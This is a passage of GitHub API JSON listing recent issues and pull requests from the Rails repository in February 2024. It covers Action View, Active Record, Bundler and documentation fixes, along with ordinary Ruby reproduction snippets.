        "events_url": "https://api.github.com/repos/rails/rails/issues/51023/events",
        "html_url": "https://github.com/rails/rails/pull/51023",
        "id": 2127203105,
        "node_id": "PR_kwDNIULOZnwfXQ",
        "number": 51023,
        "title": "Allow template to return any kind of objects",
        "user": {
            "login": "casperisfine",
            "id": 19192189,
            "node_id": "MDQ6VXNlcjE5MTkyMTg5",
            "avatar_url": "https://avatars.githubusercontent.com/u/19192189?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/casperisfine",
            "html_url": "https://github.com/casperisfine",
            "followers_url": "https://api.github.com/users/casperisfine/followers",
            "following_url": "https://api.github.com/users/casperisfine/following{/other_user}",
            "gists_url": "https://api.github.com/users/casperisfine/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/casperisfine/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/casperisfine/subscriptions",
            "organizations_url": "https://api.github.com/users/casperisfine/orgs",
            "repos_url": "https://api.github.com/users/casperisfine/repos",
            "events_url": "https://api.github.com/users/casperisfine/events{/privacy}",
            "received_events_url": "https://api.github.com/users/casperisfine/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 3666649,
                "node_id": "MDU6TGFiZWwzNjY2NjQ5",
                "url": "https://api.github.com/repos/rails/rails/labels/actionview",
                "name": "actionview",
                "color": "d7e102",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-02-09T13:55:24Z",
        "updated_at": "2024-02-10T23:36:46Z",
        "closed_at": "2024-02-09T14:10:28Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51023",
            "html_url": "https://github.com/rails/rails/pull/51023",
            "diff_url": "https://github.com/rails/rails/pull/51023.diff",
            "patch_url": "https://github.com/rails/rails/pull/51023.patch",
            "merged_at": "2024-02-09T14:10:28Z"
        },
        "body": "Fix: https://github.com/rails/rails/issues/50930\r\n\r\nWhile Action View is predominantly meant to render text, in some case it's used to render more complex object.\r\n\r\nSo we shouldn't assume `#_run` returns a buffer.\r\n\r\nFYI: @kuwabarahiroshi, @julik",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51023/reactions",
            "total_count": 2,
            "+1": 1,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 1,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51023/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51022",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51022/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51022/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51022/events",
        "html_url": "https://github.com/rails/rails/pull/51022",
        "id": 2126921549,
        "node_id": "PR_kwDNIULOZng2_w",
        "number": 51022,
        "title": "Ensure required version of Bundler to be installed in the container",
        "user": {
            "login": "igor-alexandrov",
            "id": 100725,
            "node_id": "MDQ6VXNlcjEwMDcyNQ==",
            "avatar_url": "https://avatars.githubusercontent.com/u/100725?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/igor-alexandrov",
            "html_url": "https://github.com/igor-alexandrov",
            "followers_url": "https://api.github.com/users/igor-alexandrov/followers",
            "following_url": "https://api.github.com/users/igor-alexandrov/following{/other_user}",
            "gists_url": "https://api.github.com/users/igor-alexandrov/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/igor-alexandrov/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/igor-alexandrov/subscriptions",
            "organizations_url": "https://api.github.com/users/igor-alexandrov/orgs",
            "repos_url": "https://api.github.com/users/igor-alexandrov/repos",
            "events_url": "https://api.github.com/users/igor-alexandrov/events{/privacy}",
            "received_events_url": "https://api.github.com/users/igor-alexandrov/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 8,
        "created_at": "2024-02-09T11:11:20Z",
        "updated_at": "2024-02-09T15:14:00Z",
        "closed_at": "2024-02-09T14:13:52Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51022",
            "html_url": "https://github.com/rails/rails/pull/51022",
            "diff_url": "https://github.com/rails/rails/pull/51022.diff",
            "patch_url": "https://github.com/rails/rails/pull/51022.patch",
            "merged_at": null
        },
        "body": "PR enforces `bundler` version from Gemfile.lock to be installed.\r\n\r\nWhen using bundler different from the version that is installed by default in your Ruby version, you may experience an error.\r\n\r\n```\r\nTo install the version of bundler this project requires, run `gem install bundler -v '~> 2.5'`\r\nActivating bundler (~> 2.5) failed:\r\nCould not find 'bundler' (~> 2.5) - did find: [bundler-2.4.19]\r\nChecked in 'GEM_PATH=/rails/.local/share/gem/ruby/3.2.0:/usr/local/lib/ruby/gems/3.2.0:/usr/local/bundle' , execute `gem env` for more information\r\n```\r\n\r\nPR is based on the Bundler documentation and it will be a default behaviour for the future versions of the Bundler.\r\n\r\n* https://bundler.io/blog/2019/05/14/solutions-for-cant-find-gem-bundler-with-executable-bundle.html",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51022/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51022/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51021",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51021/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51021/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51021/events",
        "html_url": "https://github.com/rails/rails/pull/51021",
        "id": 2126733915,
        "node_id": "PR_kwDNIULOZnWpNw",
        "number": 51021,
        "title": "Make various minor fixes to the Active Record test suite",
        "user": {
            "login": "casperisfine",
            "id": 19192189,
            "node_id": "MDQ6VXNlcjE5MTkyMTg5",
            "avatar_url": "https://avatars.githubusercontent.com/u/19192189?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/casperisfine",
            "html_url": "https://github.com/casperisfine",
            "followers_url": "https://api.github.com/users/casperisfine/followers",
            "following_url": "https://api.github.com/users/casperisfine/following{/other_user}",
            "gists_url": "https://api.github.com/users/casperisfine/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/casperisfine/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/casperisfine/subscriptions",
            "organizations_url": "https://api.github.com/users/casperisfine/orgs",
            "repos_url": "https://api.github.com/users/casperisfine/repos",
            "events_url": "https://api.github.com/users/casperisfine/events{/privacy}",
            "received_events_url": "https://api.github.com/users/casperisfine/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-09T09:07:38Z",
        "updated_at": "2024-02-09T09:50:21Z",
        "closed_at": "2024-02-09T09:50:20Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51021",
            "html_url": "https://github.com/rails/rails/pull/51021",
            "diff_url": "https://github.com/rails/rails/pull/51021.diff",
            "patch_url": "https://github.com/rails/rails/pull/51021.patch",
            "merged_at": "2024-02-09T09:50:20Z"
        },
        "body": "Extracted from: https://github.com/rails/rails/pull/50999\r\n\r\n- Make fixtures setup and teardown methods private.\r\n- Don't run adapter thread safety tests with sqlite3_mem\r\n- Make foreign_key_tests more resilient to leaked state\r\n- Use `exit!` in fork to avoid `at_exit` side effects.\r\n- Disable transactional fixtures in tests that do a lot of low level assertions on connections or connection pools.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51021/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51021/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51020",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51020/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51020/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51020/events",
        "html_url": "https://github.com/rails/rails/issues/51020",
        "id": 2126298064,
        "node_id": "I_kwDNIULOfry70A",
        "number": 51020,
        "title": "`FileNotFoundError` in `AnalyzeJob`",
        "user": {
            "login": "northeastprince",
            "id": 55164724,
            "node_id": "MDQ6VXNlcjU1MTY0NzI0",
            "avatar_url": "https://avatars.githubusercontent.com/u/55164724?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/northeastprince",
            "html_url": "https://github.com/northeastprince",
            "followers_url": "https://api.github.com/users/northeastprince/followers",
            "following_url": "https://api.github.com/users/northeastprince/following{/other_user}",
            "gists_url": "https://api.github.com/users/northeastprince/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/northeastprince/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/northeastprince/subscriptions",
            "organizations_url": "https://api.github.com/users/northeastprince/orgs",
            "repos_url": "https://api.github.com/users/northeastprince/repos",
            "events_url": "https://api.github.com/users/northeastprince/events{/privacy}",
            "received_events_url": "https://api.github.com/users/northeastprince/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-02-09T00:50:50Z",
        "updated_at": "2024-02-10T00:40:59Z",
        "closed_at": "2024-02-10T00:40:58Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "[Our app](https://github.com/hackclub/hackathons-backend) runs on the edge, and after [this week's Rails update](https://github.com/hackclub/hackathons-backend/pull/425) we started getting [the Active Storage errors](https://github.com/hackclub/hackathons-backend/issues/427). Reverting fixed the problem.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51020/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51020/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51019",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51019/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51019/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51019/events",
        "html_url": "https://github.com/rails/rails/pull/51019",
        "id": 2126259448,
        "node_id": "PR_kwDNIULOZm9J0w",
        "number": 51019,
        "title": "Remove memoization to accept `key_provider` overridden by `with_encryption_context`",
        "user": {
            "login": "jhawthorn",
            "id": 131752,
            "node_id": "MDQ6VXNlcjEzMTc1Mg==",
            "avatar_url": "https://avatars.githubusercontent.com/u/131752?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/jhawthorn",
            "html_url": "https://github.com/jhawthorn",
            "followers_url": "https://api.github.com/users/jhawthorn/followers",
            "following_url": "https://api.github.com/users/jhawthorn/following{/other_user}",
            "gists_url": "https://api.github.com/users/jhawthorn/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/jhawthorn/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/jhawthorn/subscriptions",
            "organizations_url": "https://api.github.com/users/jhawthorn/orgs",
            "repos_url": "https://api.github.com/users/jhawthorn/repos",
            "events_url": "https://api.github.com/users/jhawthorn/events{/privacy}",
            "received_events_url": "https://api.github.com/users/jhawthorn/received_events",
            "type": "User",
            "site_admin": true
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-02-09T00:07:26Z",
        "updated_at": "2024-02-13T21:53:57Z",
        "closed_at": "2024-02-13T21:10:38Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51019",
            "html_url": "https://github.com/rails/rails/pull/51019",
            "diff_url": "https://github.com/rails/rails/pull/51019.diff",
            "patch_url": "https://github.com/rails/rails/pull/51019.patch",
            "merged_at": "2024-02-13T21:10:38Z"
        },
        "body": "Somewhat similar to #48923 (but with a different cause), as of 7.1 we weren't correctly observing `key_provider` when overridden with `with_encryption_context`. I believe this regressed in #44540 (though it feels possible in some cases there would have been a memoization problem beforehand).\r\n\r\nReported by @kstevens715. Thank you!\r\n\r\nI'll also backport this to 7-1-stable",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51019/reactions",
            "total_count": 1,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 1,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51019/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51018",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51018/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51018/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51018/events",
        "html_url": "https://github.com/rails/rails/issues/51018",
        "id": 2126253598,
        "node_id": "I_kwDNIULOfrwOHg",
        "number": 51018,
        "title": "Pure ruby view templates, pages and components",
        "user": {
            "login": "sebyx07",
            "id": 5052549,
            "node_id": "MDQ6VXNlcjUwNTI1NDk=",
            "avatar_url": "https://avatars.githubusercontent.com/u/5052549?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/sebyx07",
            "html_url": "https://github.com/sebyx07",
            "followers_url": "https://api.github.com/users/sebyx07/followers",
            "following_url": "https://api.github.com/users/sebyx07/following{/other_user}",
            "gists_url": "https://api.github.com/users/sebyx07/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/sebyx07/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/sebyx07/subscriptions",
            "organizations_url": "https://api.github.com/users/sebyx07/orgs",
            "repos_url": "https://api.github.com/users/sebyx07/repos",
            "events_url": "https://api.github.com/users/sebyx07/events{/privacy}",
            "received_events_url": "https://api.github.com/users/sebyx07/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-02-09T00:00:22Z",
        "updated_at": "2024-02-09T00:05:11Z",
        "closed_at": "2024-02-09T00:05:11Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "Came across this project called [Matestack UI Core](https://github.com/matestack/matestack-ui-core) and couldn't help but think it's pretty cool. What's your opinion on making ruby the language to write the templates instead of html, and also write abstractions to reduce the need of js:\r\n\r\nHere's a quick look at how it works:\r\n\r\nFor controllers, pretty standard stuff:\r\n\r\n```ruby\r\nclass ItemsController < ApplicationController\r\n  def index\r\n    @items = Item.all\r\n  end\r\n\r\n  def show\r\n    item = Item.find(params[:id])\r\n    render Items::ShowPage.new(item:)\r\n  end\r\nend\r\n```\r\n\r\nAnd then, instead of juggling between HTML and Ruby, you keep it all Ruby:\r\n\r\n`views/index.rb`\r\n\r\n```ruby\r\nh1 \"Items\"\r\n\r\n@items.each do |item|\r\n  div do\r\n    link_to item.title, item_path(item)\r\n  end\r\nend\r\n```\r\n\r\nspan \"Items count: #{@items.count}\"\r\n\r\n`pages/items/show_page`\r\n\r\n```ruby\r\nmodule Items\r\n  class ShowPage\r\n    include ActivePage\r\n    attr_reader :item\r\n\r\n    def initialize(item:)\r\n      @item = item\r\n    end\r\n\r\n    def template\r\n      page_title\r\n      div class: 'card' do\r\n         div do\r\n            h3 item.title\r\n        \r\n            link_to \"Items\" items_path\r\n        \r\n            render Items::ItemDetailsComponent.new(item:)\r\n         end\r\n      end\r\n    end\r\n    \r\n    def page_title\r\n      h1 \"Show Item\", class: 'title'\r\n    end\r\n    \r\n    def style\r\n       {\r\n         h1: {\r\n            color: 'red'\r\n         }\r\n       }\r\n    end\r\n  end\r\nend\r\n```\r\n\r\nAnd you can define components like so:\r\n\r\n`components/items/item_details_component`\r\n\r\n```ruby\r\nmodule Items\r\n  class ItemDetailsComponent\r\n    include ActiveComponent\r\n    \r\n    attr_reader :item\r\n\r\n    def initialize(item:)\r\n      @item = item\r\n    end\r\n\r\n    def template\r\n      table do\r\n        # Details go here\r\n      end\r\n    end\r\n  end\r\nend\r\n```\r\nI'm thinking this could really simplify how we handle views and frontend logic in Rails apps. Plus, it's Ruby through and through, which is always a plus\r\n\r\nAlso there is [matestack-ui-vuejs](https://github.com/matestack/matestack-ui-vuejs) which has some really interesting ways to hide the use of js.\r\n\r\nThis could pave the path to leveraging powerful component libraries similar to those available in React, such as Ant Design or Material-UI. While Hotwire offers a solid approach, the elegance of pure Ruby, coupled with its dynamic nature, allows us to utilize JSX-like templating effectively.\r\n\r\n@dhh",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51018/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51018/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51017",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51017/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51017/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51017/events",
        "html_url": "https://github.com/rails/rails/pull/51017",
        "id": 2126073525,
        "node_id": "PR_kwDNIULOZmzFJw",
        "number": 51017,
        "title": "Improve documentation of ActiveSupport::TimeZone.create [ci-skip]",
        "user": {
            "login": "p8",
            "id": 28561,
            "node_id": "MDQ6VXNlcjI4NTYx",
            "avatar_url": "https://avatars.githubusercontent.com/u/28561?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/p8",
            "html_url": "https://github.com/p8",
            "followers_url": "https://api.github.com/users/p8/followers",
            "following_url": "https://api.github.com/users/p8/following{/other_user}",
            "gists_url": "https://api.github.com/users/p8/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/p8/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/p8/subscriptions",
            "organizations_url": "https://api.github.com/users/p8/orgs",
            "repos_url": "https://api.github.com/users/p8/repos",
            "events_url": "https://api.github.com/users/p8/events{/privacy}",
            "received_events_url": "https://api.github.com/users/p8/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107194,
                "node_id": "MDU6TGFiZWwxMDcxOTQ=",
                "url": "https://api.github.com/repos/rails/rails/labels/activesupport",
                "name": "activesupport",
                "color": "FC9300",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-08T21:10:03Z",
        "updated_at": "2024-02-10T07:13:01Z",
        "closed_at": "2024-02-09T23:31:27Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51017",
            "html_url": "https://github.com/rails/rails/pull/51017",
            "diff_url": "https://github.com/rails/rails/pull/51017.diff",
            "patch_url": "https://github.com/rails/rails/pull/51017.patch",
            "merged_at": "2024-02-09T23:31:27Z"
        },
        "body": "The `create` method is currently marked as an alias of `new`. However, because `new` is later overridden, it's no longer an alias.\r\n\r\nThis requires wrapping the `alias_method` with stopdoc/startdoc, as the method is still marked as an alias otherwise (adding `:nodoc:` to `alias_method` [doesn't work yet](https://github.com/ruby/rdoc/pull/1090)). \r\n\r\nThe `initialize` method has to be wrapped with stopdoc/startdoc as well, as the `new` method will still be documented for the initialized. Adding a `:nodoc:` instead will remove documentation for all following methods.\r\n\r\n### Before\r\n\r\n<img width=\"1003\" alt=\"image\" src=\"https://github.com/rails/rails/assets/28561/d3e2419d-b1e9-41ed-869d-fdc544e2aff3\">\r\n\r\n### After\r\n\r\n<img width=\"995\" alt=\"image\" src=\"https://github.com/rails/rails/assets/28561/d85a2a89-398c-4ce6-8edc-a7d445cfe0dc\">\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51017/reactions",
            "total_count": 1,
            "+1": 1,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51017/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51016",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51016/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51016/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51016/events",
        "html_url": "https://github.com/rails/rails/pull/51016",
        "id": 2125979206,
        "node_id": "PR_kwDNIULOZmt9gw",
        "number": 51016,
        "title": "Document that lock_version column is integer",
        "user": {
            "login": "javierav",
            "id": 99700,
            "node_id": "MDQ6VXNlcjk5NzAw",
            "avatar_url": "https://avatars.githubusercontent.com/u/99700?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/javierav",
            "html_url": "https://github.com/javierav",
            "followers_url": "https://api.github.com/users/javierav/followers",
            "following_url": "https://api.github.com/users/javierav/following{/other_user}",
            "gists_url": "https://api.github.com/users/javierav/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/javierav/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/javierav/subscriptions",
            "organizations_url": "https://api.github.com/users/javierav/orgs",
            "repos_url": "https://api.github.com/users/javierav/repos",
            "events_url": "https://api.github.com/users/javierav/events{/privacy}",
            "received_events_url": "https://api.github.com/users/javierav/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-08T20:03:17Z",
        "updated_at": "2024-02-16T09:42:23Z",
        "closed_at": "2024-02-14T23:55:48Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51016",
            "html_url": "https://github.com/rails/rails/pull/51016",
            "diff_url": "https://github.com/rails/rails/pull/51016.diff",
            "patch_url": "https://github.com/rails/rails/pull/51016.patch",
            "merged_at": "2024-02-14T23:55:48Z"
        },
        "body": "### Motivation / Background\r\n\r\nThe Rails documentation does not reflect that the `lock_version` column must be of type integer.\r\n\r\n### Detail\r\n\r\nThis PR adds the required type to the `ActiveRecord::Locking::Optimistic` documentation.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51016/reactions",
            "total_count": 1,
            "+1": 1,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51016/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51015",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51015/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51015/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51015/events",
        "html_url": "https://github.com/rails/rails/issues/51015",
        "id": 2125785191,
        "node_id": "I_kwDNIULOfrToZw",
        "number": 51015,
        "title": "`render \"fizz\"` and `render partial: \"fizz\"` behave differently when given a block",
        "user": {
            "login": "bradgessler",
            "id": 4628,
            "node_id": "MDQ6VXNlcjQ2Mjg=",
            "avatar_url": "https://avatars.githubusercontent.com/u/4628?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/bradgessler",
            "html_url": "https://github.com/bradgessler",
            "followers_url": "https://api.github.com/users/bradgessler/followers",
            "following_url": "https://api.github.com/users/bradgessler/following{/other_user}",
            "gists_url": "https://api.github.com/users/bradgessler/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/bradgessler/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/bradgessler/subscriptions",
            "organizations_url": "https://api.github.com/users/bradgessler/orgs",
            "repos_url": "https://api.github.com/users/bradgessler/repos",
            "events_url": "https://api.github.com/users/bradgessler/events{/privacy}",
            "received_events_url": "https://api.github.com/users/bradgessler/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-02-08T18:04:34Z",
        "updated_at": "2024-02-08T22:08:54Z",
        "closed_at": null,
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n\r\nThe following demonstrates the error:\r\n\r\n```ruby\r\n# frozen_string_literal: true\r\n\r\nrequire \"bundler/inline\"\r\n\r\ngemfile(true) do\r\n  source \"https://rubygems.org\"\r\n\r\n  git_source(:github) { |repo| \"https://github.com/#{repo}.git\" }\r\n\r\n  gem \"rails\"\r\n  # If you want to test against edge Rails replace the previous line with this:\r\n  # gem \"rails\", github: \"rails/rails\", branch: \"main\"\r\nend\r\n\r\nrequire \"minitest/autorun\"\r\nrequire \"action_view\"\r\n\r\nclass BugTest < ActionView::TestCase\r\n  def setup\r\n    @controller.append_view_path \".\"\r\n  end\r\n\r\n  def test_stuff\r\n    page = <<~ERB\r\n    <h1>Partial Bug</h1>\r\n\r\n    <p>This works.</p>\r\n\r\n    <%= render \"partial\" do %>\r\n      The first partial\r\n    <% end %>\r\n\r\n    <p>This fails.</p>\r\n\r\n    <%= render partial: \"partial\" do %>\r\n      The third partial\r\n    <% end %>\r\n\r\n    <p>This achieves the intended outcome of passing a block into a `partial:` render.</p>\r\n\r\n    <%= render layout: \"partial\" do %>\r\n      The second partial\r\n    <% end %>\r\n    ERB\r\n\r\n    partial = <<~ERB\r\n    <p>\r\n      Start\r\n      <%= yield %>\r\n      End\r\n    </p>\r\n    ERB\r\n\r\n    File.write(\"_partial.html.erb\", partial)\r\n\r\n    render inline: page\r\n  end\r\nend\r\n```\r\n\r\n### Expected behavior\r\n\r\nBoth blocks in the script above should behave the same.\r\n\r\n### Actual behavior\r\n\r\nThe following exception is raised:\r\n\r\n```\r\nActionView::Template::Error: 'nil' is not an ActiveModel-compatible object. It must implement :to_partial_path.\r\n```\r\n\r\n### System configuration\r\n**Rails version**: `Rails 7.1.3`\r\n\r\n**Ruby version**: `ruby 3.3.0 (2023-12-25 revision 5124f9ac75) [arm64-darwin23]`\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51015/reactions",
            "total_count": 1,
            "+1": 1,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51015/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51014",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51014/labels{/name}",
